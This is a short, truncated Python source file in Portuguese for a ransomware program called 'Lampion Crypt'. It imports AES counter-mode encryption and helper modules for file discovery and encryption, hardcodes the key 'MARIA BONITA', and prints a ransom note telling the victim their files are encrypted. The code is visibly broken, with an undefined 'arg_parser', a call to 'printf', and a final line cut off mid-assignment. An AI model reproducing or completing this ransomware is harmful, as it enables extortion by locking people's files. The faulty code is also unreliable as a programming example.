#!/usr/bin/python3.9

# -*- coding: utf-8 -*-

from Crypto.Cipher import AES

from Crypto.Util import Counter 

import argparse

import os

import Discovery

import Crypter 


# -------------------
# A senha pode ter os sequintes tamanhos 
# 128/192/256 bits - 8 bits = byte = 1 letra unicode 
#----------------

HARDCODED_KEY = 'MARIA BONITA'


def get_parser():
    parser = arg_parser.ArgumentParser(description = "Lampeon")
    parser.add_argument(
        '-d', '--decrypt', help='decripta arquivos [default: no]', action='store_true')
    return parser 

def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        printf('''
        LAMPION CRYPT : UM RANSOM COM UMA PEXERA NA MÃO!
        ------------------------------------------------
        Seus arquivos foram encryptados.
        Para decryptalos diga em que batalha morreu maria '{}'
        '''.format(HARDCODED_KEY))
        key = input('Digite a senha > ')
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    ctr = Counter.new(128)
    crypt = 